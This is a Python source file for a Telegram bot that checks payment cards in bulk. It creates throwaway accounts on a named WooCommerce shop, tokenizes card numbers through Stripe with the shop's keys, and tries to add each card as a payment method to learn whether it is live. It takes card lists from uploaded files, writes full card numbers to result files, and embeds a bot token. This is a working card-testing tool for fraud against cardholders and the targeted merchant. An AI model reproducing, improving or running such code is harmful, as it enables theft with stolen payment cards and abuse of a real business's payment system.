import requests, re, random, string, json, time, sys, threading
import os
from datetime import datetime

# ===== CONFIGURATION =====
P_URL = "" 
S_PK = 'pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs'
S_ACC = 'acct_1Mpulb2El1QixccJ'

BOT_TOKEN = "8103948431:AAEZgtxTZPA1tvuo8Lc6iA5-UZ7RFiqSzhs"  # Replace with your actual bot token

# ===== CARD CHECKING CLASS (ORIGINAL FUNCTIONALITY - NO CHANGES) =====
class Gate:
    def __init__(self):
        self.s = requests.Session()
        if P_URL:
            self.s.proxies = {'http': P_URL, 'https': P_URL}
            
        self.s.headers.update({
            'authority': 'redbluechair.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'origin': 'https://redbluechair.com',
            'referer': 'https://redbluechair.com/my-account/',
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        })

    def rnd_str(self, l=10):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=l))

    def reg(self):
        try:
            r1 = self.s.get('https://redbluechair.com/my-account/')
            n = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', r1.text).group(1)
            rnd = self.rnd_str()
            dt = {
                'email': f'user{rnd}@gmail.com',
                'password': f'Pass{rnd}!!',
                'register': 'Register',
                'woocommerce-register-nonce': n,
                '_wp_http_referer': '/my-account/'
            }
            r2 = self.s.post('https://redbluechair.com/my-account/', data=dt)
            return "Log out" in r2.text
        except:
            return False

    def tok(self, cc, mm, yy, cvv):
        try:
            h = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': self.s.headers['user-agent']
            }
            d = {
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'key': S_PK,
                '_stripe_account': S_ACC,
                'payment_user_agent': 'stripe.js/cba9216f35; stripe-js-v3/cba9216f35; payment-element; deferred-intent',
                'referrer': 'https://redbluechair.com',
                'guid': '8c58666c-8edd-46ee-a9ce-0390cd63f8028e5c25',
                'muid': 'ea2ab4e5-2059-438e-b27d-3bd4d6a94ae29d8630',
                'sid': '53c09a94-1512-4db1-b3c0-f011656359e1281fed'
            }
            r = requests.post('https://api.stripe.com/v1/payment_methods', headers=h, data=d)
            return r.json().get('id')
        except:
            return None

    def add(self, pm):
        try:
            r1 = self.s.get('https://redbluechair.com/my-account/add-payment-method/')
            txt = r1.text
            n = None
            m1 = re.search(r'"createSetupIntentNonce":"([^"]+)"', txt)
            if m1: n = m1.group(1)
            if not n:
                m2 = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', txt)
                if m2: n = m2.group(1)
            if not n:
                m3 = re.search(r'"create_setup_intent_nonce":"([a-z0-9]+)"', txt)
                if m3: n = m3.group(1)
            
            if not n: return "Error"

            h = self.s.headers.copy()
            h.update({'x-requested-with': 'XMLHttpRequest', 'referer': 'https://redbluechair.com/my-account/add-payment-method/'})
            
            pl = {
                'action': (None, 'create_setup_intent'),
                'wcpay-payment-method': (None, pm),
                '_ajax_nonce': (None, n)
            }
            
            r2 = self.s.post('https://redbluechair.com/wp-admin/admin-ajax.php', headers=h, files=pl)
            js = r2.json()
            
            if js.get('success') is True:
                return "Approved"
            else:
                msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                return msg
        except:
            return "Error"

# ===== STYLISH FORMATTING FUNCTIONS =====
def create_progress_bar(percentage, width=15):
    """Create a compact progress bar"""
    filled = int(width * percentage / 100)
    empty = width - filled
    return "█" * filled + "░" * empty

def format_time(seconds):
    """Format seconds into compact time"""
    if seconds < 60:
        return f"{int(seconds)}s"
    elif seconds < 3600:
        mins = int(seconds // 60)
        secs = int(seconds % 60)
        return f"{mins}m {secs}s"
    else:
        hours = int(seconds // 3600)
        mins = int((seconds % 3600) // 60)
        return f"{hours}h {mins}m"

def get_status_info(result):
    """Get appropriate emoji and descriptive message for status"""
    # First, check for declines (case insensitive)
    result_lower = str(result).lower()
    
    if result == "Approved":
        return "✅", "Approved - Card is valid"
    elif "declined" in result_lower or "card" in result_lower or "security" in result_lower or "fund" in result_lower:
        # These are likely decline messages
        if result == "Declined":
            return "❌", "Declined - Card was declined"
        elif "security" in result_lower:
            return "❌", "Declined - Security code incorrect"
        elif "fund" in result_lower:
            return "❌", "Declined - Insufficient funds"
        elif "card" in result_lower:
            return "❌", "Declined - " + result
        else:
            return "❌", "Declined - " + result
    elif result == "Error":
        return "⚠️", "Error - Processing error"
    else:
        # Unknown result
        return "⚠️", "Error - " + str(result)

def mask_card(card_number):
    """Mask card number compactly"""
    if len(card_number) >= 10:
        return f"{card_number[:6]}***{card_number[-4:]}"
    return card_number

# ===== SIMPLE TELEGRAM BOT IMPLEMENTATION =====
import telebot
from telebot import types

# Global storage
checking_processes = {}
results_data = {}

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='Markdown')

def process_single_card(card_line, message_id):
    """Process a single card - ORIGINAL CORE FUNCTIONALITY"""
    if not card_line.strip():
        return "❌ Empty line"
    
    sp = card_line.strip().split('|')
    if len(sp) < 4:
        return f"❌ Format error"
    
    cc, mm, yy, cvv = sp[0], sp[1], sp[2], sp[3]
    
    api = Gate()
    if api.reg():
        tok = api.tok(cc, mm, yy, cvv)
        if tok:
            res = api.add(tok)
        else:
            res = "Error - Tokenization failed"
    else:
        res = "Error - Registration failed"
    
    emoji, description = get_status_info(res)
    
    return {
        'card': cc,
        'exp': f"{mm}/{yy}",
        'result': res,
        'emoji': emoji,
        'description': description,
        'masked': mask_card(cc),
        'is_decline': emoji == "❌",  # Track if it's a decline
        'is_error': emoji == "⚠️",     # Track if it's an error
        'is_approved': emoji == "✅"   # Track if it's approved
    }

def process_file_mass_check(filename, message_id, user_id, chat_id):
    """Process cards from file with progress updates - UPDATED TO UPDATE AFTER EACH CARD"""
    try:
        with open(filename, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
        
        total = len(lines)
        if total == 0:
            return "empty"
        
        # Initialize check data
        check_id = f"check_{user_id}_{int(time.time())}"
        checking_processes[check_id] = {
            'user_id': user_id,
            'chat_id': chat_id,
            'total': total,
            'current': 0,
            'completed': 0,
            'start_time': time.time(),
            'running': True,
            'results': [],
            'progress_msg_id': None,
            'stop_button_msg_id': None,
            'last_update_time': time.time()
        }
        
        results_data[check_id] = {
            'approved': 0,
            'declined': 0,
            'error': 0,
            'cards': []
        }
        
        # Send initial progress message
        send_progress_update(check_id, initial=True)
        
        # Process cards
        for i, card_line in enumerate(lines, 1):
            if not checking_processes[check_id]['running']:
                break
            
            checking_processes[check_id]['current'] = i
            
            # Process card
            result = process_single_card(card_line, message_id)
            
            checking_processes[check_id]['completed'] = i
            checking_processes[check_id]['results'].append(result)
            
            # Update stats based on actual status
            if isinstance(result, dict):
                if result['is_approved']:
                    results_data[check_id]['approved'] += 1
                elif result['is_decline']:
                    results_data[check_id]['declined'] += 1
                elif result['is_error']:
                    results_data[check_id]['error'] += 1
                else:
                    # Default to error for unknown
                    results_data[check_id]['error'] += 1
                
                results_data[check_id]['cards'].append(result)
            
            # UPDATE AFTER EACH CARD (removed the if condition)
            send_progress_update(check_id)
            
            time.sleep(1)
        
        # Send final report
        if check_id in checking_processes and checking_processes[check_id]['running']:
            send_final_report(check_id)
        
        return check_id
        
    except Exception as e:
        return f"error: {str(e)}"

def send_progress_update(check_id, initial=False):
    """Send progress update to user - UPDATED FOR REAL-TIME UPDATES"""
    if check_id not in checking_processes:
        return
    
    check = checking_processes[check_id]
    total = check['total']
    completed = check['completed']
    
    # Throttle updates if they're too fast (minimum 0.5 seconds between updates)
    current_time = time.time()
    if not initial and current_time - check.get('last_update_time', 0) < 0.5:
        return
    
    checking_processes[check_id]['last_update_time'] = current_time
    
    # Calculate progress
    progress_percent = 0 if total == 0 else int((completed / total) * 100)
    progress_bar = create_progress_bar(progress_percent)
    
    # Calculate time
    elapsed_time = time.time() - check['start_time']
    elapsed_str = format_time(elapsed_time)
    
    # Calculate ETA if we have data
    eta_str = ""
    if completed > 0 and completed < total:
        time_per_card = elapsed_time / completed
        remaining_cards = total - completed
        eta_seconds = time_per_card * remaining_cards
        eta_str = f" • ETA: `{format_time(eta_seconds)}`"
    
    # Get last card result
    last_card_info = ""
    if check['results']:
        last_result = check['results'][-1]
        if isinstance(last_result, dict):
            short_desc = last_result['description'].split(' - ')[0]
            last_card_info = f"\n\n*Last Checked:*\n`{last_result['masked']}` {last_result['emoji']} {short_desc}"
    
    # Get recent cards (last 3)
    recent_cards = ""
    if len(check['results']) > 1:
        recent_cards = "\n\n*Recent:*\n"
        for result in check['results'][-3:]:
            if isinstance(result, dict):
                short_desc = result['description'].split(' - ')[0]
                recent_cards += f"`{result['masked']}` {result['emoji']} {short_desc}\n"
    
    # Create message
    message = (
        f"*MASS CHECK IN PROGRESS*\n"
        f"`{progress_bar}` {progress_percent}%\n"
        f"`{completed}/{total}` cards • `{elapsed_str}`{eta_str}"
        f"{last_card_info}"
        f"{recent_cards}"
    )
    
    # Create inline keyboard with stop button
    keyboard = types.InlineKeyboardMarkup()
    stop_button = types.InlineKeyboardButton(text="🛑 STOP CHECK", callback_data=f"stop_{check_id}")
    keyboard.add(stop_button)
    
    try:
        # Update progress message
        if check['progress_msg_id']:
            bot.edit_message_text(
                chat_id=check['chat_id'],
                message_id=check['progress_msg_id'],
                text=message,
                parse_mode='Markdown',
                reply_markup=keyboard
            )
        else:
            msg = bot.send_message(
                chat_id=check['chat_id'],
                text=message,
                parse_mode='Markdown',
                reply_markup=keyboard
            )
            checking_processes[check_id]['progress_msg_id'] = msg.message_id
            checking_processes[check_id]['stop_button_msg_id'] = msg.message_id
    except:
        pass

def send_final_report(check_id):
    """Send final report and results file to user - UPDATED WITH PROPER EMOJIS"""
    if check_id not in checking_processes or check_id not in results_data:
        return
    
    check = checking_processes[check_id]
    results = results_data[check_id]
    
    elapsed_time = time.time() - check['start_time']
    elapsed_str = format_time(elapsed_time)
    total_cards = len(results['cards'])
    
    # Save results file
    results_file = save_results_file(check_id)
    
    # Calculate success rate
    success_rate = int((results['approved'] / total_cards * 100)) if total_cards > 0 else 0
    
    # Create summary WITH PROPER EMOJIS
    summary = (
        f"*CHECK COMPLETE*\n"
        f"`{total_cards}` cards • `{elapsed_str}`\n"
        f"`{success_rate}%` success rate\n\n"
        f"✅ `{results['approved']}` Approved\n"
        f"❌ `{results['declined']}` Declined\n"
        f"⚠️ `{results['error']}` Errors\n\n"
    )
    
    # Add recent results with proper emojis
    if results['cards']:
        summary += "*Recent Results:*\n"
        for card in results['cards'][-5:]:
            # Shorten description for display
            short_desc = card['description'].split(' - ')[0]
            # USE THE EMOJI FROM THE CARD DATA
            summary += f"`{card['masked']}` {card['emoji']} {short_desc}\n"
    
    # Send summary
    bot.send_message(
        chat_id=check['chat_id'],
        text=summary,
        parse_mode='Markdown'
    )
    
    # Send results file
    if os.path.exists(results_file):
        with open(results_file, 'rb') as f:
            bot.send_document(
                chat_id=check['chat_id'],
                document=f,
                caption=f"Results: {check_id}",
                visible_file_name=f"results_{check_id}.txt"
            )
    
    # Clean up
    if check_id in checking_processes:
        del checking_processes[check_id]

def save_results_file(check_id):
    """Save results to a file - UPDATED WITH PROPER EMOJIS IN FILE"""
    if check_id not in results_data:
        return None
    
    results = results_data[check_id]
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"results_{check_id}.txt"
    
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"CHECK RESULTS - {timestamp}\n")
            f.write(f"ID: {check_id}\n")
            f.write("=" * 60 + "\n")
            f.write(f"TOTAL CARDS: {len(results['cards'])}\n")
            f.write(f"✅ APPROVED: {results['approved']}\n")
            f.write(f"❌ DECLINED: {results['declined']}\n")
            f.write(f"⚠️ ERRORS: {results['error']}\n")
            f.write(f"SUCCESS RATE: {int((results['approved'] / len(results['cards']) * 100)) if results['cards'] else 0}%\n")
            f.write("=" * 60 + "\n\n")
            f.write("DETAILED RESULTS:\n")
            f.write("-" * 60 + "\n")
            
            for i, card in enumerate(results['cards'], 1):
                # USE THE EMOJI FROM THE CARD DATA IN THE FILE
                emoji = card['emoji']
                status_text = ""
                if card['is_approved']:
                    status_text = "APPROVED"
                elif card['is_decline']:
                    status_text = "DECLINED"
                else:
                    status_text = "ERROR"
                
                f.write(f"{i:03d}. {emoji} {card['card']}|{card['exp']}|{status_text}|{card['description']}\n")
        
        return filename
    except Exception as e:
        print(f"Error saving results: {e}")
        return None

# ===== BOT COMMAND HANDLERS =====
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    welcome_text = (
        "*CARD CHECKER BOT*\n\n"
        "*Commands:*\n"
        "• /check CC|MM|YY|CVV\n"
        "• Send .txt file for mass check\n"
        "• /status - Show active checks\n\n"
        "*Format:* CC|MM|YY|CVV"
    )
    bot.reply_to(message, welcome_text, parse_mode='Markdown')

@bot.message_handler(commands=['check'])
def check_single_card(message):
    """Handle single card check"""
    try:
        parts = message.text.split(' ', 1)
        if len(parts) < 2:
            bot.reply_to(message, "*Format:* `/check CC|MM|YY|CVV`")
            return
        
        card_line = parts[1].strip()
        
        # Process card
        result = process_single_card(card_line, message.message_id)
        
        if isinstance(result, dict):
            response = (
                f"*CARD CHECK*\n"
                f"`{result['masked']}`\n"
                f"*Status:* {result['emoji']} {result['description']}"
            )
        else:
            response = f"*ERROR*\n{result}"
        
        bot.reply_to(message, response, parse_mode='Markdown')
        
    except Exception as e:
        bot.reply_to(message, f"*ERROR*\n`{str(e)}`")

@bot.message_handler(commands=['status'])
def show_status(message):
    """Show active checks"""
    user_id = message.from_user.id
    active_checks = []
    
    for check_id, check in checking_processes.items():
        if check['user_id'] == user_id and check['running']:
            progress = 0 if check['total'] == 0 else int((check['completed'] / check['total']) * 100)
            progress_bar = create_progress_bar(progress, 10)
            elapsed = format_time(time.time() - check['start_time'])
            
            active_checks.append(
                f"*{check_id}*\n`{progress_bar}` {progress}%\n`{check['completed']}/{check['total']}` • `{elapsed}`\n"
            )
    
    if active_checks:
        response = "*ACTIVE CHECKS*\n\n" + "\n".join(active_checks)
    else:
        response = "*NO ACTIVE CHECKS*"
    
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(func=lambda m: True, content_types=['document'])
def handle_document(message):
    """Handle file uploads"""
    try:
        if not message.document.file_name.endswith('.txt'):
            bot.reply_to(message, "*Send .txt file only*")
            return
        
        # Download file
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Save temporarily
        filename = f"temp_{message.from_user.id}_{int(time.time())}.txt"
        with open(filename, 'wb') as f:
            f.write(downloaded_file)
        
        # Send initial message
        init_msg = bot.reply_to(message, "*Processing file...*")
        
        # Start mass check
        def run_mass_check():
            check_id = process_file_mass_check(
                filename, 
                message.message_id, 
                message.from_user.id,
                message.chat.id
            )
            
            if check_id == "empty":
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=init_msg.message_id,
                    text="*FILE EMPTY*"
                )
            elif check_id.startswith("error:"):
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=init_msg.message_id,
                    text=f"*ERROR*\n`{check_id[6:]}`"
                )
            
            # Clean up
            try:
                os.remove(filename)
            except:
                pass
        
        # Start thread
        import threading
        thread = threading.Thread(target=run_mass_check)
        thread.start()
        
    except Exception as e:
        bot.reply_to(message, f"*ERROR*\n`{str(e)}`")

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def handle_stop_button(call):
    """Handle stop button callback"""
    try:
        check_id = call.data.split('_', 1)[1]
        
        if check_id in checking_processes:
            if checking_processes[check_id]['user_id'] == call.from_user.id:
                checking_processes[check_id]['running'] = False
                
                # Save partial results
                if check_id in results_data:
                    results_file = save_results_file(check_id)
                    
                    # Send partial results
                    check = checking_processes[check_id]
                    completed = check['completed']
                    total = check['total']
                    results = results_data[check_id]
                    
                    summary = (
                        f"*CHECK STOPPED*\n"
                        f"`{completed}/{total}` cards processed\n\n"
                        f"✅ `{results['approved']}` Approved\n"
                        f"❌ `{results['declined']}` Declined\n"
                        f"⚠️ `{results['error']}` Errors"
                    )
                    
                    bot.send_message(
                        chat_id=call.message.chat.id,
                        text=summary,
                        parse_mode='Markdown'
                    )
                    
                    # Send partial results file
                    if results_file and os.path.exists(results_file):
                        with open(results_file, 'rb') as f:
                            bot.send_document(
                                chat_id=call.message.chat.id,
                                document=f,
                                caption=f"Partial Results: {check_id}",
                                visible_file_name=f"partial_{check_id}.txt"
                            )
                
                # Remove stop button and update message
                try:
                    bot.edit_message_reply_markup(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        reply_markup=None
                    )
                    
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text=f"*STOPPED*\n`{check_id}`",
                        parse_mode='Markdown'
                    )
                except:
                    pass
                
                # Clean up
                if check_id in checking_processes:
                    del checking_processes[check_id]
                
                bot.answer_callback_query(call.id, "Check stopped")
            else:
                bot.answer_callback_query(call.id, "Not your check")
        else:
            bot.answer_callback_query(call.id, "Check not found")
            
    except Exception as e:
        bot.answer_callback_query(call.id, f"Error: {str(e)}")

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    """Handle text messages"""
    text = message.text.strip()
    
    if '|' in text and len(text.split('|')) >= 3:
        result = process_single_card(text, message.message_id)
        
        if isinstance(result, dict):
            response = (
                f"*CARD CHECK*\n"
                f"`{result['masked']}`\n"
                f"*Status:* {result['emoji']} {result['description']}"
            )
        else:
            response = f"*ERROR*\n{result}"
        
        bot.reply_to(message, response, parse_mode='Markdown')
    else:
        bot.reply_to(message, 
            "*Send card:* CC|MM|YY|CVV\n"
            "*Or send .txt file*",
            parse_mode='Markdown'
        )

# ===== MAIN FUNCTION =====
def main():
    print("Starting Card Checker Bot...")
    
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("ERROR: Set your BOT_TOKEN in the script")
        print("Get token from @BotFather")
        return
    
    try:
        bot_info = bot.get_me()
        print(f"Bot: @{bot_info.username}")
        print("Ready for commands...")
        
        bot.infinity_polling()
        
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    main()
